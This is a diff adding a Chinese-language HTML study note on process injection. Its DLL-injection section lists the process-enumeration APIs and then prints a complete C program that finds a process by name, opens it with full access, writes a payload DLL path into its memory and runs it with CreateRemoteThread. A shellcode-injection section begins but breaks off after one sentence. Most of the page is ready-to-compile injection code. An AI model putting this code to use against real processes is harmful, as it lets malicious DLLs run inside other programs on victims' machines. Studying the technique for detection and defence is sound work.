@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># 进程注入,进程注入</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>进程注入</h1>
+<h2>1.dll 注入</h2>
+<ol>
+<li>DLL 注入：</li>
+</ol>
+<p>在将 DLL 注入进程之前，必须先选择一个目标进程，所以需要一个进程 ID（PID）来打开目标进程的句柄，并允许对目标进程执行必要的工作</p>
+<p>进程枚举需要使用到的核心函数：CreateToolhelp32Snapshot，Process32First，Process32Next</p>
+<p>进程枚举 msdn 官方示例：<a href="https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes">https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes</a></p>
+<p>主要流程：</p>
+<ul>
+<li>使用 CreateToolhelp32Snapshot 获取所有进程快照</li>
+<li>使用 Process32First 检索快照中遇到的第一个进程的信息</li>
+<li>使用 Process32Next 进行循环，根据进程名进行匹配（注意大小写的匹配）</li>
+<li>关闭进程快照句柄</li>
+</ul>
+<p>DLL 注入到目标进程所需要使用的关键函数：VirtualAllocEx，WriteProcessMemory，CreateRemoteThread</p>
+<pre><code class="language-c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;Tlhelp32.h&gt;
+
+// Gets the process handle of a process of name, szProcessName
+BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
+
+	HANDLE			hSnapShot = NULL;
+	PROCESSENTRY32	Proc = {
+					.dwSize = sizeof(PROCESSENTRY32)
+	};
+
+	// Takes a snapshot of the currently running processes 
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	if (hSnapShot == INVALID_HANDLE_VALUE) {
+		printf(&quot;[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
+		goto _EndOfFunction;
+	}
+
+	// Retrieves information about the first process encountered in the snapshot.
+	if (!Process32First(hSnapShot, &amp;Proc)) {
+		printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
+		goto _EndOfFunction;
+	}
+
+	do {
+
+		WCHAR LowerName[MAX_PATH * 2];
+
+		if (Proc.szExeFile) {
+
+			DWORD	dwSize = lstrlenW(Proc.szExeFile);
+			DWORD   i = 0;
+
+			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
+
+			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
+			// in LowerName to perform the wcscmp call later
+
+			if (dwSize &lt; MAX_PATH * 2) {
+
+				for (; i &lt; dwSize; i++)
+					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
+
+				LowerName[i++] = '\0';
+			}
+		}
+
+		// Compare the enumerated process path with what is passed
+		if (wcscmp(LowerName, szProcessName) == 0) {
+			// Save the process ID 
+			*dwProcessId = Proc.th32ProcessID;
+			// Open a process handle and return
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+			if (*hProcess == NULL)
+				printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+
+			break;
+		}
+
+		// Retrieves information about the next process recorded the snapshot.
+		// While we can still have a valid output ftom Process32Next, continue looping
+	} while (Process32Next(hSnapShot, &amp;Proc));
+
+_EndOfFunction:
+	if (hSnapShot != NULL)
+		CloseHandle(hSnapShot);
+	if (*dwProcessId == NULL || *hProcess == NULL)
+		return FALSE;
+	return TRUE;
+}
+
+// Function that will inject a DLL, DllName, into a remote process of handle, hProcess
+BOOL InjectDllToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {
+
+	BOOL		bSTATE					= TRUE;
+	
+	LPVOID		pLoadLibraryW			= NULL;
+	LPVOID		pAddress				= NULL;
+
+	DWORD		dwSizeToWrite			= lstrlenW(DllName) * sizeof(WCHAR);
+
+	SIZE_T		lpNumberOfBytesWritten	= NULL;
+
+	HANDLE		hThread					= NULL;
+
+	// Getting the base address of LoadLibraryW function
+	pLoadLibraryW = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);
+	if (pLoadLibraryW == NULL){
+		printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+	// Allocating memory in hProcess of size dwSizeToWrite and memory permissions set to read and write
+	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	printf(&quot;[i] pAddress Allocated At : 0x%p Of Size : %d\n&quot;, pAddress, dwSizeToWrite);
+	printf(&quot;[#] Press &lt;Enter&gt; To Write ... &quot;);
+	getchar();
+
+	// Writing DllName to the allocated memory pAddress
+	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){
+		printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	printf(&quot;[i] Successfully Written %d Bytes\n&quot;, lpNumberOfBytesWritten);
+	printf(&quot;[#] Press &lt;Enter&gt; To Run ... &quot;);
+	getchar();
+
+	// Running LoadLibraryW in a new thread, passing pAddress as a parameter which contains the DLL name
+	printf(&quot;[i] Executing Payload ... &quot;);
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+	if (hThread == NULL) {
+		printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+	printf(&quot;[+] DONE !\n&quot;);
+
+
+_EndOfFunction:
+	if (hThread)
+		CloseHandle(hThread);
+	return bSTATE;
+}
+
+int wmain(int argc, wchar_t* argv[]) {
+	
+	HANDLE	hProcess		= NULL;
+	DWORD	dwProcessId		= NULL;
+
+	// Checking command line arguments
+	if (argc &lt; 3){
+		wprintf(L&quot;[!] Usage : \&quot;%s\&quot; &lt;Complete Dll Payload Path&gt; &lt;Process Name&gt; \n&quot;, argv[0]);
+		return -1;
+	}
+	
+	// Getting the handle of the remote process
+	wprintf(L&quot;[i] Searching For Process Id Of \&quot;%s\&quot; ... &quot;, argv[2]);
+	if (!GetRemoteProcessHandle(argv[2], &amp;dwProcessId, &amp;hProcess)) {
+		printf(&quot;[!] Process is Not Found \n&quot;);
+		return -1;
+	}
+	wprintf(L&quot;[+] DONE \n&quot;);
+	
+	printf(&quot;[i] Found Target Process Pid: %d \n&quot;, dwProcessId);
+	// Injecting the DLL
+	if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
+		return -1;
+	}
+
+	CloseHandle(hProcess);
+	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
+	getchar();
+	return 0;
+}
+</code></pre>
+<h2>2.shellcode 注入</h2>
+<p>shellcode 进程注入与 DLL 进程注入使用的模块类似，但有轻微更改。Shellcode 进程注入将使用几乎相同的 Windows API 来执行以下任务</p>
+
+        </main>
+    </div>
+</body>
+</html>
